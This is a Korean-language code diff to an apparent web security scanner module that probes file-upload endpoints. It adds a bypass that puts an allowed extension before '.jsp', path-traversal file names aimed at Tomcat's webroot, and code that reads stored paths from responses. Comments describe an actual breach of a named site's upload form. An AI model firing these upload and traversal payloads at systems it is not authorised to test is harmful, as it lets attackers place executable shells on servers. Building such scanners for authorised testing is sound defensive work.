@@ -11,8 +11,12 @@
                **2xx 라고 다 받는 자리는 아니다** — Next.js 같은 앱은 POST 에도 화면(HTML)을 그대로
                돌려준다. 화면이 오거나, 파일을 빼고 보내도 같은 것이 오면 받는 자리가 아니다
                (11-21 실측: 관리자 웹 화면 라우트 11곳이 이것 때문에 전부 '확장자 검증 없음' 으로 잘못 잡혔다)
-  ② 기본       그냥 .jsp·.php·.html 을 올린다 — 받아 주면 확장자 검증이 없다
-  ③ 심화       이름에 경로를 섞는다(`../`, 역슬래시, 절대 경로) — 받아 주면 올릴 자리를 고를 수 있다
+  ② 기본       그냥 .jsp·.php·.html 을 올린다 — 받아 주면 확장자 검증이 없다. 막히면 **허용 확장자를
+               앞에 끼워** `이름.pdf.jsp` 로 다시 올린다. 검사가 '이름에 허용 확장자가 들어 있나' 만
+               보면 이 모양이 지나가고 톰캣은 마지막 `.jsp` 를 실행한다(팀 라이트업 2026-11-15 의 길)
+  ③ 심화       ② 에서 **받아 준 그 이름** 에 경로를 섞는다(`../`, 리터럴 역슬래시 네 단계, 절대 경로)
+               — 받아 주면 올릴 자리를 고를 수 있다. 허용 확장자가 안 들어간 이름으로 섞으면 ② 에서
+               막힌 그대로라 아무것도 못 본다
   ④ 우회       검증이 있을 때 지나가는 모양: 겹친 확장자(.jsp.txt), 대소문자(.JsP), 널바이트, 세미콜론,
                Content-Type 만 바꾸기
 
@@ -32,6 +36,12 @@ import uuid
 from dashboard import core, probe
 from dashboard.core import Check
 
+# 허용 확장자를 **앞에** 끼운 겹친 확장자에 쓴다. 새싹에듀 과제 제출이 이 모양으로 뚫렸다
+# (팀 라이트업 2026-11-15): 확장자 검사가 '이름 안에 허용 확장자가 들어 있나(contains)' 라서
+# `shell.pdf.jsp` 가 통과하고, 톰캣은 **마지막** `.jsp` 만 보고 실행한다. 뒤에 붙이는
+# `x.jsp.txt` 와 반대 모양이다 — 그쪽만 보던 전까지는 이 서버에서 아무것도 못 찾았다.
+ALLOW_DEFAULT = "pdf,png,txt"
+
 META = {
     "id": "upload_probe",
     "name": "파일 업로드 검증 점검",
@@ -45,8 +55,9 @@ META = {
     "severity": "critical",
     "attack": [{"tactic": "TA0001", "technique": "T1190", "name": "Exploit Public-Facing Application"},
                {"tactic": "TA0002", "technique": "T1059", "name": "Command and Scripting Interpreter"}],
-    "description": "고른 **주소마다** 파일을 올려 ② 그냥 .jsp·.php 를 받아 주는지, ③ 이름에 섞은 경로(`../`·역슬래시)를 "
-                   "따르는지, ④ 겹친 확장자·대소문자·널바이트로 검증을 지나가는지 봅니다. "
+    "description": "고른 **주소마다** 파일을 올려 ② 그냥 .jsp·.php 를, 막히면 **허용 확장자를 앞에 끼운** "
+                   "`이름.pdf.jsp` 를 받아 주는지, ③ 그 이름에 섞은 경로(`../`·리터럴 역슬래시)를 따르는지, "
+                   "④ 대소문자·널바이트·Content-Type 으로 검증을 지나가는지 봅니다. "
                    "**파일이 올라가 남습니다 — 끝난 뒤 직접 지우세요.** 표식으로 찾을 수 있게 근거에 적어 둡니다.",
     "needs": [
         {"kind": "account", "required": False,
@@ -59,6 +70,9 @@ META = {
         {"name": "extra", "need": "optional", "label": "같이 보낼 값(이름=값, 줄마다 하나)", "type": "textarea", "default": "",
          "placeholder": "title=점검용\nlectureId=103",
          "help": "업로드 폼이 다른 칸도 요구하면 여기에 적습니다. 없으면 ① 단계가 400 으로 끝납니다."},
+        {"name": "allow", "need": "optional", "label": "그 화면이 허용한다는 확장자", "default": ALLOW_DEFAULT,
+         "help": "파일 선택 창이 보여 주는 목록을 적습니다. 이름 **앞쪽**에 끼워 `이름.pdf.jsp` 로 "
+                 "보내 봅니다 — 검사가 '이름에 들어 있나' 만 보면 이 모양으로 지나갑니다."},
     ],
 }
 _REC = ("확장자를 **허용 목록** 으로 가리고(서버에서, 이름이 아니라 내용도 함께), 올라간 파일의 이름은 서버가 새로 "
@@ -70,8 +84,9 @@ MARK = "ttalkkak-upload-check"
 # 받아 주면 서버에서 돌 수 있는 확장자 — 새싹에듀는 Tomcat 이라 .jsp 가 가장 위험하다
 RUNNABLE = [(".jsp", "application/octet-stream"), (".jspx", "application/octet-stream"),
             (".php", "application/octet-stream"), (".html", "text/html")]
-# 이름에 경로를 섞는 모양. 리터럴 역슬래시는 노션의 '과제 업로드 경로 조작' 건과 같은 모양이다
-PATHS = ["../{m}.jsp", "..\\{m}.jsp", "....//{m}.jsp", "/etc/{m}.jsp", "..%2f{m}.jsp"]
+# 이름에 경로를 섞는 모양. 리터럴 역슬래시 네 단계는 팀이 실제로 쓴 모양이다
+# (`..\..\..\..\api\webapps\ROOT\shell.pdf.jsp` — 저장 코드가 `\` 를 `/` 로 바꿔 그대로 경로로 쓴다)
+PATHS = ["../{n}", "..\\{n}", "..\\..\\..\\..\\{n}", "....//{n}", "/etc/{n}", "..%2f{n}"]
 # 검증이 있을 때 지나가 보는 모양
 TRICKS = [("{m}.jsp.txt", "text/plain", "겹친 확장자"), ("{m}.JsP", "application/octet-stream", "대소문자 섞기"),
           ("{m}.jsp%00.txt", "text/plain", "널바이트"), ("{m}.jsp;.txt", "text/plain", "세미콜론"),
@@ -121,9 +136,23 @@ def real_url(url: str) -> str:
     return re.sub(r"\{[^}/]+\}", "1", url)
 
 
+def stored(resp, mark: str) -> str:
+    """응답에 저장 자리가 보이면 그 한 토막 — 보이면 '올라갔다' 를 눈으로 확인할 수 있다.
+
+    새싹에듀 과제 제출은 201 과 함께 `work` 에 저장 경로와 UUID 를 돌려준다
+    (`assignment/123/../../../../api/webapps/ROOT/4918a0b8_shell.pdf.jsp`). 이런 서버는
+    올라간 파일을 어디서 부를지 바로 알 수 있으므로 근거에 그대로 적어 둔다.
+    """
+    i = resp.body.find(mark) if resp and resp.body else -1
+    if i < 0:
+        return ""
+    return resp.body[max(0, i - 120): i + len(mark) + 40].replace("\n", " ").strip()
+
+
 def run(target, points, params):
     field = (params.get("field") or "file").strip()
     extra = _extra(params.get("extra"))
+    allow = [e.strip().lstrip(".") for e in (params.get("allow") or ALLOW_DEFAULT).split(",") if e.strip()]
     out = []
     for p in points:
         lines, verdict, keep, title = [], "safe", None, ""
@@ -180,24 +209,46 @@ def run(target, points, params):
                     "칸 이름이 맞는지 보세요", r0)
             continue
         keep = r0
-        # ② 기본 — 그냥 돌 수 있는 확장자
+        # ② 기본 — 돌 수 있는 확장자. 그냥 보내 보고, 막히면 허용 확장자를 **앞에** 끼운다
+        took = ""                       # 받아 준 이름 — ③ 에서 이 이름에 경로를 섞는다
         for ext, ctype in RUNNABLE:
-            r = send(f"{mark}{ext}", ctype)
-            note("basic", f"{ext}: → {r.status} · {len(r.body)}B")
-            if r.status in OK:
-                note("basic", f"{ext} 를 그대로 받아 줌 — 확장자 검증이 없다")
-                verdict, keep, title = "vuln", r, "업로드 확장자 검증 없음"   # 어떤 확장자인지는 근거에
+            for name in [f"{mark}{ext}"] + [f"{mark}.{a}{ext}" for a in allow]:
+                r = send(name, ctype)
+                note("basic", f"{name}: → {r.status} · {len(r.body)}B")
+                if r.status not in OK:
+                    continue
+                took, keep, verdict = name, r, "vuln"
+                if name == f"{mark}{ext}":
+                    note("basic", f"{ext} 를 그대로 받아 줌 — 확장자 검증이 없다")
+                    title = "업로드 확장자 검증 없음"
+                else:
+                    note("basic", f"허용 확장자를 앞에 끼운 **{name}** 을 받아 줌 — 검사가 '이름에 들어 있나' "
+                                  f"만 보고 통과시킨다. 서버는 마지막 {ext} 를 실행한다")
+                    title = "업로드 확장자 검증 우회(겹친 확장자)"
+                where = stored(r, mark)
+                if where:
+                    note("basic", f"응답에 저장 자리가 보인다: {where}")
                 break
-        # ③ 심화 — 이름에 경로 섞기
-        if verdict == "safe":
-            for shape in PATHS:
-                name = shape.format(m=mark)
-                r = send(name, "application/octet-stream")
-                note("deep", f"이름에 경로({name}): → {r.status} · {len(r.body)}B")
-                if r.status in OK:
-                    note("deep", "경로를 섞은 이름을 받아 줌 — 올릴 자리를 고를 수 있다(쉘 파일을 실행되는 경로에 둘 수 있음)")
-                    verdict, keep, title = "vuln", r, "업로드 이름의 경로 조작 통과"
-                    break
+            if took:
+                break
+        # ③ 심화 — 이름에 경로 섞기. 받아 준 이름이 있으면 **그 이름** 으로 섞는다
+        #    (허용 확장자가 안 들어간 이름은 ② 에서 이미 막혔으니 경로만 바꿔도 또 막힌다)
+        base = took or (f"{mark}.{allow[0]}.jsp" if allow else f"{mark}.jsp")
+        for shape in PATHS:
+            name = shape.format(n=base)
+            r = send(name, "application/octet-stream")
+            note("deep", f"이름에 경로({name}): → {r.status} · {len(r.body)}B")
+            if r.status in OK:
+                note("deep", "경로를 섞은 이름을 받아 줌 — 올릴 자리를 고를 수 있다(쉘 파일을 실행되는 경로에 둘 수 있음)")
+                where = stored(r, mark)
+                if where:
+                    note("deep", f"응답에 저장 자리가 보인다: {where} — 그 주소를 직접 불러 확인하세요")
+                verdict, keep = "vuln", r
+                # 아무 이름이나 받는 서버라면 뿌리는 '검증이 없다' 쪽이다 — 그 제목을 덮지 않는다.
+                # 검증이 있는데 지나간 경우(겹친 확장자)에만 더 나쁜 쪽인 경로 조작으로 적는다
+                if title != "업로드 확장자 검증 없음":
+                    title = "업로드 이름의 경로 조작 통과"
+                break
         # ④ 우회 — 검증이 있을 때 지나가 보기
         if verdict == "safe":
             for shape, ctype, kind in TRICKS:
